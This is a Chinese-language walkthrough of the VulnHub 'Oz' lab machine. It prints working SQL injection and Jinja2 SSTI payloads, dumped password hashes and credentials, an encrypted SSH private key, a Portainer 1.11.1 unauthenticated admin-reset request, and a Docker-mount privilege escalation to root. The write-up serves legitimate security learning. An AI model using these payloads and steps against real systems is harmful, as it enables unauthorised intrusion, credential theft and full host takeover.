---
title: Oz Walkthrough
date: 2025-11-10
categories: ['walkthrough','vulnhub']
tags: ['sqli','ssti','portainer']
description: sqli->ssti打点，容器环境信息收集，portainer提权
author: may
image:
  path: (./../assets/images/2025-10-30-Oz-Walkthrough/cover%20(15).png
---

# Recon

这台机器开放了两个web

```shell
(py311) ┌──(kali㉿kali)-[~/vulnhub/oz]
└─$ sudo nmap --min-rate 10000 -sT -sV -A -p- -n 192.168.2.142 -oN ports
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-29 22:54 EDT
Nmap scan report for 192.168.2.142
Host is up (0.0010s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: OZ webapi
8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
| http-title: GBR Support - Login
|_Requested resource was http://192.168.2.142:8080/login
MAC Address: 00:0C:29:19:FD:DB (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 3.13 - 4.4 (95%), Linux 3.16 - 4.6 (95%), Linux 3.8 - 3.16 (95%), Linux 4.4 (95%), Linux 3.13 (94%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (91%), Linux 4.10 (91%), Android 8 - 9 (Linux 3.18 - 4.4) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   1.04 ms 192.168.2.142

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.77 seconds
```

80端口是webapi，8080端口有一个登录界面

![image-20251030105951840](./../assets/images/2025-10-30-Oz-Walkthrough/image-20251030105951840.png)

![image-20251031133117896](./../assets/images/2025-10-30-Oz-Walkthrough/image-20251031133117896.png)

## webapi

服务器自定义了404状态的response，访问不存在的目录时会返回随机的字符

![image-20251104002255156](./../assets/images/2025-10-30-Oz-Walkthrough/image-20251104002255156.png)

所以目录扫描工具在低自定义程度时都无法准确的进行目录扫描

feroxbuster对目录扫描的自定义程度较高，发现了`/users`接口

```shell
(py311) ┌──(kali㉿kali)-[~/vulnhub/oz]
└─$ feroxbuster -u http://192.168.2.142 -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.2.142/
 🚩  In-Scope Url          │ 192.168.2.142
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l        -w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        4l        6w       75c http://192.168.2.142/
500      GET        4l       40w      291c http://192.168.2.142/users/current
500      GET        4l       40w      291c http://192.168.2.142/users/login
200      GET        4l        6w       75c http://192.168.2.142/?:

```

直接访问与首页无异，接上一个用户名admin访问后返回一串json

![image-20251104143501413](./../assets/images/2025-10-30-Oz-Walkthrough/image-20251104143501413.png)

单引号报错，说明存在注入

![image-20251104143553964](./../assets/images/2025-10-30-Oz-Walkthrough/image-20251104143553964.png)

手工测试`' or 1=1 -- `报错，使用`' or 1=1 -- -`成功

这是由于注入点被`trim()`了，它类似于python strip()函数 会去除字符串两端空格等字符

![image-20251104145643116](./../assets/images/2025-10-30-Oz-Walkthrough/image-20251104145643116.png)

开始注入

```json
库名：
http://192.168.2.142/users/admin'union select database(); -- x
{"Username":[{"username":"admin"},{"username":"ozdb"}]}

表名：
http://192.168.2.142/users/admin'union select group_concat(table_name) from information_schema.tables where table_schema='ozdb'; -- x
{"Username":[{"username":"admin"},{"username":"tickets_gbw,users_gbw"}]}

字段名：
users_gbw:http://192.168.2.142/users/admin'union select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users_gbw'; -- x
{"Username":[{"username":"admin"},{"username":"id,username,password"}]}
tickets_gbw:http://192.168.2.142/users/admin'union select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='tickets_gbw'; -- x
{"Username":[{"username":"admin"},{"username":"id,name,desc"}]}
```

拿数据

```json
http://192.168.2.142/users/admin'union select group_concat(id,username,password) from ozdb.users_gbw; -- x
{
  "Username": [
    {
      "username": "admin"
    },
    {
      "username": "1dorthi$pbkdf2-sha256$5000$aA3h3LvXOseYk3IupVQKgQ$ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78,2tin.man$pbkdf2-sha256$5000$GgNACCFkDOE8B4AwZgzBuA$IXewCMHWhf7ktju5Sw.W.ZWMyHYAJ5mpvWialENXofk,3wizard.oz$pbkdf2-sha256$5000$BCDkXKuVMgaAEMJ4z5mzdg$GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY,4coward.lyon$pbkdf2-sha256$5000$bU2JsVYqpbT2PqcUQmjN.Q$hO7DfQLTL6Nq2MeKei39Jn0ddmqly3uBxO/tbBuw4DY,5toto$pbkdf2-sha256$5000$Zax17l1Lac25V6oVwnjPWQ$oTYQQVsuSz9kmFggpAWB0yrKsMdPjvfob9NfBq4Wtkg,6admin$pbkdf2-sha256$5000$d47xHsP4P6eUUgoh5BzjfA$jWgyYmxDK.slJYUTsv9V9xZ3WWwcl9EBOsz.bARwGBQ"
    }
  ]
}
```

使用sqlmap dump数据

```shell
Database: ozdb
Table: users_gbw
[6 entries]
+----+----------------------------------------------------------------------------------------+-------------+
| id | password                                                                               | username    |
+----+----------------------------------------------------------------------------------------+-------------+
| 1  | $pbkdf2-sha256$5000$aA3h3LvXOseYk3IupVQKgQ$ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78 | dorthi      |
| 2  | $pbkdf2-sha256$5000$GgNACCFkDOE8B4AwZgzBuA$IXewCMHWhf7ktju5Sw.W.ZWMyHYAJ5mpvWialENXofk | tin.man     |
| 3  | $pbkdf2-sha256$5000$BCDkXKuVMgaAEMJ4z5mzdg$GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY | wizard.oz   |
| 4  | $pbkdf2-sha256$5000$bU2JsVYqpbT2PqcUQmjN.Q$hO7DfQLTL6Nq2MeKei39Jn0ddmqly3uBxO/tbBuw4DY | coward.lyon |
| 5  | $pbkdf2-sha256$5000$Zax17l1Lac25V6oVwnjPWQ$oTYQQVsuSz9kmFggpAWB0yrKsMdPjvfob9NfBq4Wtkg | toto        |
| 6  | $pbkdf2-sha256$5000$d47xHsP4P6eUUgoh5BzjfA$jWgyYmxDK.slJYUTsv9V9xZ3WWwcl9EBOsz.bARwGBQ | admin       |
+----+----------------------------------------------------------------------------------------+-------------+

[02:16:22] [INFO] table 'ozdb.users_gbw' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.2.142/dump/ozdb/users_gbw.csv'
[02:16:22] [INFO] fetching columns for table 'tickets_gbw' in database 'ozdb'
[02:16:23] [INFO] fetching entries for table 'tickets_gbw' in database 'ozdb'
Database: ozdb
Table: tickets_gbw
[11 entries]
+----+----------------------------------------------------------------------------------------------------+----------+
| id | desc                                                                                               | name     |
+----+----------------------------------------------------------------------------------------------------+----------+
| 1  | Reissued piv/pub keys for ssh server.                                                              | GBR-987  |
| 2  | Where did all these damn monkey's come from!?  I need to call pest control.                        | GBR-1204 |
| 3  | Note to self: Toto keeps chewing on the curtain, find one with dog repellent.                      | GBR-1205 |
| 4  | Priv/pub keys have been replaced. Dorthi should be able to find them in /home/dorthi/ now.         | GBR-1389 |
| 5  | Think of a better secret knock for the front door.  Doesn't seem that secure, a Lion got in today. | GBR-4034 |
| 6  | I bet you won't read the next entry.                                                               | GBR-5012 |
| 7  | HAHA! Made you look.                                                                               | GBR-7890 |
| 8  | Nothing to see here... V2hhdCBkaWQgeW91IGV4cGVjdD8=                                                | GBR-7945 |
| 9  | Seriously, stop reading these...                                                                   | GBR-8011 |
| 10 | You are just wasting time now... someone else is getting user.txt                                  | GBR-8042 |
| 11 | Look... now they've got root.txt and you don't even have user.txt                                  | GBR-8457 |
+----+----------------------------------------------------------------------------------------------------+----------+
```

john破解hash，得到wizard.oz:wizardofoz22

```shell
(py311) ┌──(kali㉿kali)-[~/vulnhub/oz]
└─$ john --format=PBKDF2-HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (PBKDF2-HMAC-SHA256 [PBKDF2-SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
wizardofoz22     (?)   
```

## http

使用破解得到的凭证登录8080端口开放的web服务

这里有一些以GBR-*命名的信息条目，点击Description会弹出描述信息，右上角的➕可以新建条目![image-20251104162157128](./../assets/images/2025-10-30-Oz-Walkthrough/image-20251104162157128.png)

description内容取自tickets_gbw表，前期dump的数据可以直接查看

```shell
(py311) ┌──(kali㉿kali)-[~/…/output/192.168.2.142/dump/ozdb]
└─$ cat tickets_gbw.csv|awk -F, '{print $2}'
desc
Reissued piv/pub keys for ssh server.
Where did all these damn monkey's come from!?  I need to call pest control.
"Note to self: Toto keeps chewing on the curtain
Priv/pub keys have been replaced. Dorthi should be able to find them in /home/dorthi/ now.
"Think of a better secret knock for the front door.  Doesn't seem that secure
I bet you won't read the next entry.
HAHA! Made you look.
Nothing to see here... V2hhdCBkaWQgeW91IGV4cGVjdD8=
"Seriously
You are just wasting time now... someone else is getting user.txt
Look... now they've got root.txt and you don't even have user.txt
```

其中有描述到ssh公私钥，并且存放在/home/dorthi目录下，还提到了knock关键字，可能在暗示后面需要port knocking

但是尝试利用sql注入点读取文件发现文件可能不存在

读取/etc/passwd也没有发现dorthi用户

![image-20251107205545259](./../assets/images/2025-10-30-Oz-Walkthrough/image-20251107205545259.png)

# shell as container-root by ssti

在前期发现的新增ticket条目的位置发现ssti

```http
POST / HTTP/1.1
Host: 192.168.2.142:8080
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US,en;q=0.9
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTc2MjU1MDgwMH0.Vk7c9v8NiQxiEO4T3cyRhn54CpdgnRg_dQBDCJ_FwVQ
Origin: http://192.168.2.142:8080
Upgrade-Insecure-Requests: 1
Referer: http://192.168.2.142:8080/
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Content-Length: 19

name={{8*8}}&desc=test
---

HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Location: http://192.168.2.142:8080/
Server: Werkzeug/0.14.1 Python/2.7.14
Date: Fri, 07 Nov 2025 21:13:10 GMT
Content-Length: 20

Name: 64 desc: test
```

使用焚靖getshell，发现是root权限

```shell
(py38) ┌──(kali㉿kali)-[~/vulnhub/oz]
└─$ fenjing crack-request -f ssti.txt -h 192.168.2.142 -p 8080
...
$>> id
[INFO] | Adding some string variables...               
[INFO] | Start generating final expression...       
[INFO] | Submit payload {{lipsum.__globals__.__builtins__.eval('__import__(\'os\').popen(\'id\').read()')}}
Name: uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 desc: test
```

但感觉这个shell环境很不对劲，ls -la /发现.dockerenv，证实所处docker环境

```shell
[INFO] | Great! we generate eval(('string', "__import__('os').popen('ls -la /').read()"))
[INFO] | Great! we generate os_popen_read('ls -la /')                              
[INFO] | Submit payload {{lipsum.__globals__.__builtins__.eval('__import__(\'os\').popen(\'ls -la /\').read()')}}                                           
Name: total 72
drwxr-xr-x   54 root     root          4096 May  1  2018 .
drwxr-xr-x   54 root     root          4096 May  1  2018 ..
-rwxr-xr-x    1 root     root             0 May  1  2018 .dockerenv
drwxr-xr-x    2 root     root          4096 Apr 24  2018 .secret
drwxr-xr-x    5 root     root          4096 May  1  2018 app
drwxr-xr-x    2 root     root          4096 Apr 27  2018 bin
drwxr-xr-x    3 root     root          4096 May  1  2018 containers
drwxr-xr-x    5 root     root           340 Nov  7 20:54 dev
drwxr-xr-x   26 root     root          4096 May  1  2018 etc
drwxr-xr-x    2 root     root          4096 Jan  9  2018 home
drwxr-xr-x    9 root     root          4096 May  1  2018 lib
lrwxrwxrwx    1 root     root            12 Jan  9  2018 linuxrc -> /bin/busybox
drwxr-xr-x    5 root     root          4096 Jan  9  2018 media
drwxr-xr-x    2 root     root          4096 Jan  9  2018 mnt
dr-xr-xr-x  173 root     root             0 Nov  7 20:54 proc
drwx------    3 root     root          4096 May  1  2018 root
drwxr-xr-x    2 root     root          4096 Jan  9  2018 run
drwxr-xr-x    2 root     root          4096 Jan  9  2018 sbin
drwxr-xr-x    2 root     root          4096 Jan  9  2018 srv
dr-xr-xr-x   13 root     root             0 Nov  7 20:54 sys
drwxrwxrwt    2 root     root          4096 Nov  7 20:54 tmp
drwxr-xr-x   25 root     root          4096 May  1  2018 usr
drwxr-xr-x   17 root     root          4096 May  1  2018 var
```

根目录下还有.secret目录，其中存在knockd.conf，为portknocking配置文件，在其中得到了knock序列

```shell
$>> ls -la /.secret
[INFO] | Adding some string variables...
[INFO] | Great! gen_string_1 says string('ls -la /.secret') can be 'ls -la /.secret'       
[INFO] | Start generating final expression...
[INFO] | Great! we generate os_popen_obj('ls -la /.secret')   
[INFO] | Great! we generate os_popen_read('ls -la /.secret')
[INFO] | Submit payload {{(ez.__eq__.__globals__.sys.modules.os.popen('ls -la /.secret')).read()}}
Name: total 12
drwxr-xr-x    2 root     root          4096 Apr 24  2018 .
drwxr-xr-x   54 root     root          4096 May  1  2018 ..
-rw-r--r--    1 root     root           262 Apr 24  2018 knockd.conf
 desc: test
$>> cat /.secret/knockd.conf
[INFO] | Adding some string variables...                             
[INFO] | Great! gen_string_1 says string('cat /.secret/knockd.conf') can be 'cat /.secret/knockd.conf    
[INFO] | Start generating final expression...                               
[INFO] | Great! we generate os_popen_obj('cat /.secret/knockd.conf')                                
[INFO] | Great! we generate os_popen_read('cat /.secret/knockd.conf')                                  
[INFO] | Submit payload {{(ez.__eq__.__globals__.sys.modules.os.popen('cat /.secret/knockd.conf')).read()}}
Name: [options]
        logfile = /var/log/knockd.log
[opencloseSSH]
        sequence        = 40809:udp,50212:udp,46969:udp
        seq_timeout     = 15
        start_command   = ufw allow from %IP% to any port 22
        cmd_timeout     = 10
        stop_command    = ufw delete allow from %IP% to any port 22
        tcpflags        = syn
 desc: test
```

枚举当前目录文件，在ticketer/database.py中得到mysql密码N0Pl4c3L1keH0me，用户名为dorthi

```python
Name: #!/usr/bin/python
# -*- coding: utf-8 -*-
from flask_sqlalchemy import SQLAlchemy
from . import app
app.config[&#39;SQLALCHEMY_DATABASE_URI&#39;] = &#39;mysql+pymysql://dorthi:N0Pl4c3L1keH0me@10.100.10.4/ozdb&#39;
db = SQLAlchemy(app)

class Users(db.Model):
    __tablename__ = &#39;users_gbw&#39;
    id = db.Column(&#39;id&#39;, db.Integer, primary_key=True)
    username = db.Column(&#39;username&#39;, db.Text, nullable=False)
    password = db.Column(&#39;password&#39;, db.Text, nullable=False)

class Tickets(db.Model):
    __tablename__ = &#39;tickets_gbw&#39;
    id = db.Column(&#39;id&#39;, db.Integer, primary_key=True)
    ticket_name = db.Column(&#39;name&#39;, db.String(10), nullable=False)
    ticket_desc = db.Column(&#39;desc&#39;, db.Text, nullable=False)

db.create_all()
db.session.commit()
 desc: test
```

# shell as dorthi by id_rsa

knock后打开了ssh，但是ssh连接发现不允许密码登录，必须使用私钥登录

```shell
(py38) ┌──(kali㉿kali)-[~/vulnhub/oz]
└─$ knock 192.168.2.142 -u 40809:udp 50212:udp 46969:udp                                                                                                                                     
(py38) ┌──(kali㉿kali)-[~/vulnhub/oz]
└─$ nmap -p 22 192.168.2.142                            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-09 08:52 EST
Nmap scan report for 192.168.2.142
Host is up (0.00076s latency).

PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 00:0C:29:19:FD:DB (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds                                                                                                                                                 
(py38) ┌──(kali㉿kali)-[~/vulnhub/oz]
└─$ ssh dorthi@192.168.2.142
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
dorthi@192.168.2.142: Permission denied (publickey).
```

可能是靶机设计的bug或者容器的bug，没有办法获取私钥，只能从网上copy了

```shell
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,66B9F39F33BA0788CD27207BF8F2D0F6

RV903H6V6lhKxl8dhocaEtL4Uzkyj1fqyVj3eySqkAFkkXms2H+4lfb35UZb3WFC
b6P7zYZDAnRLQjJEc/sQVXuwEzfWMa7pYF9Kv6ijIZmSDOMAPjaCjnjnX5kJMK3F
e1BrQdh0phWAhhUmbYvt2z8DD/OGKhxlC7oT/49I/ME+tm5eyLGbK69Ouxb5PBty
h9A+Tn70giENR/ExO8qY4WNQQMtiCM0tszes8+guOEKCckMivmR2qWHTCs+N7wbz
a//JhOG+GdqvEhJp15pQuj/3SC9O5xyLe2mqL1TUK3WrFpQyv8lXartH1vKTnybd
9+Wme/gVTfwSZWgMeGQjRXWe3KUsgGZNFK75wYtA/F/DB7QZFwfO2Lb0mL7Xyzx6
ZakulY4bFpBtXsuBJYPNy7wB5ZveRSB2f8dznu2mvarByMoCN/XgVVZujugNbEcj
evroLGNe/+ISkJWV443KyTcJ2iIRAa+BzHhrBx31kG//nix0vXoHzB8Vj3fqh+2M
EycVvDxLK8CIMzHc3cRVUMBeQ2X4GuLPGRKlUeSrmYz/sH75AR3zh6Zvlva15Yav
5vR48cdShFS3FC6aH6SQWVe9K3oHzYhwlfT+wVPfaeZrSlCH0hG1z9C1B9BxMLQr
DHejp9bbLppJ39pe1U+DBjzDo4s6rk+Ci/5dpieoeXrmGTqElDQi+KEU9g8CJpto
bYAGUxPFIpPrN2+1RBbxY6YVaop5eyqtnF4ZGpJCoCW2r8BRsCvuILvrO1O0gXF+
wtsktmylmHvHApoXrW/GThjdVkdD9U/6Rmvv3s/OhtlAp3Wqw6RI+KfCPGiCzh1V
0yfXH70CfLO2NcWtO/JUJvYH3M+rvDDHZSLqgW841ykzdrQXnR7s9Nj2EmoW72IH
znNPmB1LQtD45NH6OIG8+QWNAdQHcgZepwPz4/9pe2tEqu7Mg/cLUBsTYb4a6mft
icOX9OAOrcZ8RGcIdVWtzU4q2YKZex4lyzeC/k4TAbofZ0E4kUsaIbFV/7OMedMC
zCTJ6rlAl2d8e8dsSfF96QWevnD50yx+wbJ/izZonHmU/2ac4c8LPYq6Q9KLmlnu
vI9bLfOJh8DLFuqCVI8GzROjIdxdlzk9yp4LxcAnm1Ox9MEIqmOVwAd3bEmYckKw
w/EmArNIrnr54Q7a1PMdCsZcejCjnvmQFZ3ko5CoFCC+kUe1j92i081kOAhmXqV3
c6xgh8Vg2qOyzoZm5wRZZF2nTXnnCQ3OYR3NMsUBTVG2tlgfp1NgdwIyxTWn09V0
nOzqNtJ7OBt0/RewTsFgoNVrCQbQ8VvZFckvG8sV3U9bh9Zl28/2I3B472iQRo+5
uoRHpAgfOSOERtxuMpkrkU3IzSPsVS9c3LgKhiTS5wTbTw7O/vxxNOoLpoxO2Wzb
/4XnEBh6VgLrjThQcGKigkWJaKyBHOhEtuZqDv2MFSE6zdX/N+L/FRIv1oVR9VYv
QGpqEaGSUG+/TSdcANQdD3mv6EGYI+o4rZKEHJKUlCI+I48jHbvQCLWaR/bkjZJu
XtSuV0TJXto6abznSC1BFlACIqBmHdeaIXWqH+NlXOCGE8jQGM8s/fd/j5g1Adw3
-----END RSA PRIVATE KEY-----
```

将id_rsa文件权限改为600后登录，发现需要密码，使用前期枚举得到的N0Pl4c3L1keH0me登录

```shell
(py38) ┌──(kali㉿kali)-[~/vulnhub/oz]
└─$ ssh dorthi@192.168.2.142 -i id.rsa
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id.rsa': 
dorthi@Oz:~$ 
```

# shell as root by portainer

例行枚举，发现允许执行sudo docker network ls和inspect

```shell
dorthi@Oz:~$ sudo -ll
Matching Defaults entries for dorthi on Oz:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dorthi may run the following commands on Oz:

Sudoers entry:
    RunAsUsers: ALL
    Options: !authenticate
    Commands:
        /usr/bin/docker network inspect *

Sudoers entry:
    RunAsUsers: ALL
    Options: !authenticate
    Commands:
        /usr/bin/docker network ls
```

查看bridge network详细信息

```shell
dorthi@Oz:~$ sudo docker network ls
NETWORK ID          NAME                DRIVER              SCOPE
aa527124960a        bridge              bridge              local
49c1b0c16723        host                host                local
3ccc2aa17acf        none                null                local
48148eb6a512        prodnet             bridge              local
dorthi@Oz:~$ sudo docker network inspect bridge
[
    {
        "Name": "bridge",
        "Id": "aa527124960a1df4fa9022ebd215e4c4f736a001590a576b55e3b0d1ca1482d8",
        "Created": "2025-11-09T17:26:24.048540506-06:00",
        "Scope": "local",
        "Driver": "bridge",
        "EnableIPv6": false,
        "IPAM": {
            "Driver": "default",
            "Options": null,
            "Config": [
                {
                    "Subnet": "172.17.0.0/16",
                    "Gateway": "172.17.0.1"
                }
            ]
        },
        "Internal": false,
        "Attachable": false,
        "Containers": {
            "e267fc4f305575070b1166baf802877cb9d7c7c5d7711d14bfc2604993b77e14": {
                "Name": "portainer-1.11.1",
                "EndpointID": "92efe92574f0001e6545991f801b63eff1b0a01d317d267273b6f9f0b7f05033",
                "MacAddress": "02:42:ac:11:00:02",
                "IPv4Address": "172.17.0.2/16",
                "IPv6Address": ""
            }
        },
        "Options": {
            "com.docker.network.bridge.default_bridge": "true",
            "com.docker.network.bridge.enable_icc": "true",
            "com.docker.network.bridge.enable_ip_masquerade": "true",
            "com.docker.network.bridge.host_binding_ipv4": "0.0.0.0",
            "com.docker.network.bridge.name": "docker0",
            "com.docker.network.driver.mtu": "1500"
        },
        "Labels": {}
    }
]
```

发现存在portainer-1.11.1容器，ip为172.17.0.2

```json
        "Containers": {
            "e267fc4f305575070b1166baf802877cb9d7c7c5d7711d14bfc2604993b77e14": {
                "Name": "portainer-1.11.1",
                "EndpointID": "92efe92574f0001e6545991f801b63eff1b0a01d317d267273b6f9f0b7f05033",
                "MacAddress": "02:42:ac:11:00:02",
                "IPv4Address": "172.17.0.2/16",
                "IPv6Address": ""
            }
        },
```

这台机器上有nmap，对该容器扫描得到了9000/tcp端口

```shell
dorthi@Oz:~$ nmap -Pn -n -p- 172.17.0.2

Starting Nmap 7.01 ( https://nmap.org ) at 2025-11-09 18:51 CST
Nmap scan report for 172.17.0.2
Host is up (0.000038s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
9000/tcp open  cslistener

Nmap done: 1 IP address (1 host up) scanned in 0.59 seconds
```

通过ssh转发目标服务器中172.17.0.2:9000的服务到本地19000端口

```shell
(py311) ┌──(kali㉿kali)-[~/vulnhub/oz]
└─$ ssh -L 19000:172.17.0.2:9000 dorthi@192.168.2.142 -i id.rsa
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id.rsa': 
dorthi@Oz:~$ 
```

访问127.0.0.1:19000得到portainer

![image-20251110162446596](./../assets/images/2025-10-30-Oz-Walkthrough/image-20251110162446596.png)

前面根据容器名称能知道版本为1.11.1，该版本存在未授权更改管理员用户密码的漏洞

https://github.com/portainer/portainer/issues/493

```tex
Steps to reproduce the issue:
  1.  Run portainer
  2.  POST to /api/users/admin/init with json [password: mypassword]
  3.  login with this password
  4.  POST to /api/users/admin/init with json [password: myotherpassword] without Authorization header
  5.  Login with mypassword is impossible
  6.  Login with myotherpassword is possible
```

发包即可

```http
POST /api/users/admin/init HTTP/1.1
Host: 127.0.0.1:19000
Accept-Encoding: gzip, deflate, br, zstd
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTc2MjczNzE3OH0.9gQ0zDEI-GnfNo79_HrtgiSNrKvcpg2JRNaOxZMhaiI
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 18

{"password":"Admin@123"}
```

然后成功登录portainer

![image-20251110164039138](./../assets/images/2025-10-30-Oz-Walkthrough/image-20251110164039138.png)

查看镜像

![image-20251110171053027](./../assets/images/2025-10-30-Oz-Walkthrough/image-20251110171053027.png)

容器

![image-20251110171113914](./../assets/images/2025-10-30-Oz-Walkthrough/image-20251110171113914.png)

新建容器，使用python:2.7-alpine镜像，console选中tty

![image-20251110171320501](./../assets/images/2025-10-30-Oz-Walkthrough/image-20251110171320501.png)

volumes将宿主机根目录挂载到/rootfs

![image-20251110171552718](./../assets/images/2025-10-30-Oz-Walkthrough/image-20251110171552718.png)

进入容器console，将/rootfs/bin/bash赋予suid权限

![image-20251110172603129](./../assets/images/2025-10-30-Oz-Walkthrough/image-20251110172603129.png)

回到ssh，执行bash -p得到root权限

![image-20251110172650663](./../assets/images/2025-10-30-Oz-Walkthrough/image-20251110172650663.png)
